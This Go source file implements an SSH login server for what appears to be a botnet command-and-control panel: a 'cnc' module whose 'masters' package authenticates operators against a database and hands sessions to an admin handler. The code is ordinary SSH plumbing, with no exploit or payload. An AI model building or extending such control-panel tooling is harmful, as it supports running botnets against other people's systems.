package masters

import (
	"cnc/core/config"
	"cnc/core/database"
	"cnc/core/utils"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"net"
	"os"
	"time"

	"golang.org/x/crypto/ssh"
)

func StartSSH() {
	configStr := &ssh.ServerConfig{
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {

			loggedIn, _, err := database.DatabaseConnection.TryLogin(c.User(), string(pass), c.RemoteAddr().String())
			if err != nil {
				return nil, err
			}
			if !loggedIn {
				return nil, fmt.Errorf("password rejected for %q", c.User())
			}
			return &ssh.Permissions{
				Extensions: map[string]string{
					"username": c.User(),
				},
			}, nil
		},
	}

	keyPath := "assets/id_rsa"
	keyBytes, err := os.ReadFile(keyPath)
	if err != nil {

		fmt.Println("Generating new SSH host key...")
		key, err := rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			fmt.Printf("Failed to generate host key: %v\n", err)
			return
		}
		keyBytes = encodePrivateKeyToPEM(key)
		if err := os.WriteFile(keyPath, keyBytes, 0600); err != nil {
			fmt.Printf("Failed to write host key: %v\n", err)
			return
		}
	}

	private, err := ssh.ParsePrivateKey(keyBytes)
	if err != nil {
		fmt.Printf("Failed to parse host key: %v\n", err)
		return
	}

	configStr.AddHostKey(private)

	sshPort := config.Config.Server.Port + 1
	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%d", config.Config.Server.Host, sshPort))
	if err != nil {
		fmt.Printf("Failed to listen for SSH on port %d: %v\n", sshPort, err)
		return
	}

	utils.Infof("Listening for SSH connections port=%d", sshPort)

	for {
		nConn, err := listener.Accept()
		if err != nil {
			fmt.Printf("Failed to accept incoming connection: %v\n", err)
			continue
		}

		go func() {

			sConn, chans, reqs, err := ssh.NewServerConn(nConn, configStr)
			if err != nil {

				return
			}

			go ssh.DiscardRequests(reqs)

			for newChannel := range chans {
				if newChannel.ChannelType() != "session" && newChannel.ChannelType() != "shell" {
					newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
					continue
				}

				channel, requests, err := newChannel.Accept()
				if err != nil {
					continue
				}

				go func(in <-chan *ssh.Request) {
					for req := range in {
						switch req.Type {
						case "pty-req":
							req.Reply(true, nil)
						case "shell":
							req.Reply(true, nil)
						case "env":
							req.Reply(true, nil)
						default:
							req.Reply(false, nil)
						}
					}
				}(requests)

				sshConn := &SSHConn{
					Channel: channel,
					Conn:    nConn,
				}

				admin := NewAdmin(sshConn)
				admin.IsSSH = true
				if sConn.Permissions != nil && sConn.Permissions.Extensions != nil {
					admin.Username = sConn.Permissions.Extensions["username"]
				}
				admin.Handle()
			}
		}()
	}
}

func encodePrivateKeyToPEM(privateKey *rsa.PrivateKey) []byte {
	privDER := x509.MarshalPKCS1PrivateKey(privateKey)
	privBlock := pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: privDER,
	}
	return pem.EncodeToMemory(&privBlock)
}

type SSHConn struct {
	ssh.Channel
	Conn net.Conn
}

func (s *SSHConn) Read(b []byte) (n int, err error) {
	return s.Channel.Read(b)
}

func (s *SSHConn) Write(b []byte) (n int, err error) {
	return s.Channel.Write(b)
}

func (s *SSHConn) Close() error {
	return s.Channel.Close()
}

func (s *SSHConn) LocalAddr() net.Addr {
	return s.Conn.LocalAddr()
}

func (s *SSHConn) RemoteAddr() net.Addr {
	return s.Conn.RemoteAddr()
}

func (s *SSHConn) SetDeadline(t time.Time) error {

	return nil
}

func (s *SSHConn) SetReadDeadline(t time.Time) error {
	return nil
}

func (s *SSHConn) SetWriteDeadline(t time.Time) error {
	return nil
}
